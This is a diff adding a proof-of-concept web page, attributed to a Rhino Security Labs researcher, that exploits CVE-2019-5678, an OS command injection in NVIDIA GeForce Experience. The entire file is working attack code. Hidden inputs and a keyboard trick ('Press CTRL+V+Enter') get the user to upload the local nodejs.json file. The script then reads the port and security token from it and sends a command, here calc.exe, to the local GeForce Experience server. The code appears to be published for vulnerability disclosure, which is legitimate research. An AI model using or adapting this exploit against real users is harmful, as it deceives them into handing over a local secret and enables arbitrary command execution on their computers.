@@ -1,0 +1,66 @@
+<!-- 
+POC for CVE‑2019‑5678 Nvidia GeForce Experience OS command injection via a web browser
+Author: David Yesland -- Rhino Security Labs
+ -->
+<html>
+   <head>
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+   </head>
+   <body>
+      <script>
+         //Send request to local GFE server
+          function submitRequest(port,secret)
+          {
+           var xhr = new XMLHttpRequest();
+           xhr.open("POST", "http:\/\/127.0.0.1:"+port+"\/gfeupdate\/autoGFEInstall\/", true);
+           xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8");
+           xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+           xhr.setRequestHeader("Content-Type", "text\/html");
+          xhr.setRequestHeader("X_LOCAL_SECURITY_COOKIE", secret);
+           var body = "\""+document.getElementById("cmd").value+"\"";
+          var aBody = new Uint8Array(body.length);
+           for (var i = 0; i < aBody.length; i++)
+             aBody[i] = body.charCodeAt(i); 
+           xhr.send(new Blob([aBody]));
+          }
+          
+          $(document).on('change', '.file-upload-button', function(event) {
+          var reader = new FileReader();
+          
+          reader.onload = function(event) {
+          var jsonObj = JSON.parse(event.target.result);
+          submitRequest(jsonObj.port,jsonObj.secret);
+          }
+          
+          reader.readAsText(event.target.files[0]);
+          });
+          
+          //Copy text from some text field
+          function myFunction() {
+          var copyText = document.getElementById("myInput");
+          copyText.select();
+          document.execCommand("copy");
+          
+          }
+          
+          //trigger the copy and file window on ctrl press
+          $(document).keydown(function(keyPressed) {
+          if (keyPressed.keyCode == 17) {
+          myFunction();document.getElementById('file-input').click();
+          }
+          });
+      </script>
+      <h2>
+         Press CTRL+V+Enter
+      </h2>
+      <!--Command to run in a hidden input field-->
+      <input type="hidden" value="calc.exe" id="cmd" size="55">
+      <!--Hidden text box to copy text from-->
+      <div style="opacity: 0.0;">
+         <input type="text" value="%LOCALAPPDATA%\NVIDIA Corporation\NvNode\nodejs.json"
+            id="myInput" size="1">
+      </div>
+      <!--file input-->
+      <input id="file-input" onchange="file_changed(this)" onclick="this.value=null;" accept="application/json" class='file-upload-button' type="file" name="name" style="display: none;" />
+   </body>
+</html>
